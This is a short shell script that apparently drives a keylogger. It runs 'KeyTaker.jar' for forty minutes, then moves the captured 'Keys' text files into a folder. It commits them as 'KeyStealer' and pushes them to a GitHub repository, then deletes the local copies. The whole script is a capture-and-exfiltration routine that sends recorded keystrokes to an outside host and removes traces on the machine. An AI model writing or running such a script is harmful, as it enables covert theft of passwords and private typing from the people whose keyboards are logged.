java -jar KeyTaker.jar & sleep 2400 ; kill $!
git remote set-url origin https://github.com/Menge456/KeyListenerStuff
mv Keys***.txt keys/
git add keys/Keys***.txt
git commit -m "KeyStealer"
git push origin
rm Keys***.txt
